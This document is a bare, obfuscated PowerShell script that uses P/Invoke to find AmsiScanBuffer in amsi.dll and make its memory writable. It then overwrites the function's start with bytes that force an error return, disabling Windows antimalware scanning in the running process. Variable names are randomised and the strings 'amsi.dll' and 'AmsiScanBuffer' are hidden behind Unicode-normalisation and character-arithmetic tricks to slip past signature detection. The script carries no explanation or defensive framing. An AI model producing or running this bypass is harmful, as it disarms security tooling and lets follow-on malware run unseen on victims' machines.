$eBi6TUOEwP7p5QA7 = @"
using System;
using System.Runtime.InteropServices;
public class eBi6TUOEwP7p5QA7 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr S3WNZl5e6y, string b1l3);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr keMGcf5jqaGLzHY0, UIntPtr qBWMolH0Jz, uint M0lyveS9P82, out uint Cekrt8EialaHaw6dFcj);
}
"@

Add-Type $eBi6TUOEwP7p5QA7

$N5zn1_lwko8W8v3slg = [eBi6TUOEwP7p5QA7]::LoadLibrary("$(('ámsî.'+'dll').noRMalIze([CHAr](70*42/42)+[ChAr](111*53/53)+[ChAr]([byTE]0x72)+[CHar]([BYTE]0x6d)+[char](68)) -replace [cHaR]([ByTe]0x5c)+[char]([byTE]0x70)+[chAr]([BYtE]0x7b)+[chAr](77+48-48)+[CHaR](110*40/40)+[cHAR]([bYtE]0x7d))")
$uKMLN21f4Ky0X_QYRzMz = [eBi6TUOEwP7p5QA7]::GetProcAddress($N5zn1_lwko8W8v3slg, "$(('ÃmsìScãnB'+'úffèr').NORmalIze([CHAR](70*6/6)+[CHaR](111)+[CHaR](114*84/84)+[chAR](109*17/17)+[cHaR](28+40)) -replace [chAR](92+31-31)+[CHaR]([ByTE]0x70)+[Char]([bYTE]0x7b)+[CHAR](17+60)+[ChAR]([bYte]0x6e)+[CHAR](125))")
$p = 0
[eBi6TUOEwP7p5QA7]::VirtualProtect($uKMLN21f4Ky0X_QYRzMz, [uint32]5, 0x40, [ref]$p)
$bWxlC = "0xB8"
$m876 = "0x57"
$StzYCYzq_F6qc = "0x00"
$xlK_K = "0x07"
$oWsgW_Z9 = "0x80"
$yx2Q8v = "0xC3"
$IYGFQKzy = [Byte[]] ($bWxlC,$m876,$StzYCYzq_F6qc,$xlK_K,+$oWsgW_Z9,+$yx2Q8v)
[System.Runtime.InteropServices.Marshal]::Copy($IYGFQKzy, 0, $uKMLN21f4Ky0X_QYRzMz, 6)